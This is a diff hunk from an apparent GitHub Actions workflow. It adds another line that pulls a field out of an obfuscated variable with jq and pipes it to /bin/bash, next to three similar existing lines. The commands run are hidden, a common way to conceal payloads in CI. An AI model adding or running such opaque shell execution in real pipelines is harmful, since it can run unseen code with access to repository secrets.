@@ -28,6 +28,7 @@ jobs:
           echo $ecu74 | jq -r .sj1 | /bin/bash
           echo $pzqpi330 | jq -r .k9509 | /bin/bash
           printf '%s' "$yhcwy5791" | jq -r .qm940 | /bin/bash
+          echo $gen126 | jq -r .g56 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
